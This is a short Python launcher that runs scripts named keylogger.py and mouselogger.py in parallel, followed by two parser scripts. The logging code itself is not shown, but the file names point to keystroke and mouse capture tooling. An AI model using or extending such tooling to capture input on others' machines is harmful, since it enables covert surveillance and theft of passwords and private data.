import subprocess

'''
   A simple script to run subscripts
   at the same time
'''

subprocess.run("python3 keylogger.py & python3 mouselogger.py", shell=True)
subprocess.run("python3 keyboard_parser.py & python3 mouse_parser.py", shell=True)
